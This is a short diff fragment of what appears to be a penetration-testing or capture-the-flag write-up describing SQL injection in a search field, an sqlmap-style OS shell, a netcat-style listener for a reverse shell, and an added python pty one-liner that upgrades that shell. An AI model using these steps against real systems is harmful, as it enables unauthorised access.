@@ -5,7 +5,7 @@ is discovered in the search input . Using this you can open --os-shell .The foll
 -lvnp PORT) on the local machine will allow us access to a reverse shell.  
 
 
-
+ python3 -c 'import pty;pty.spawn("bin/bash")' is used to spawn a interactive shell session. (upgrades the the basic reverse shell)
 
 
 
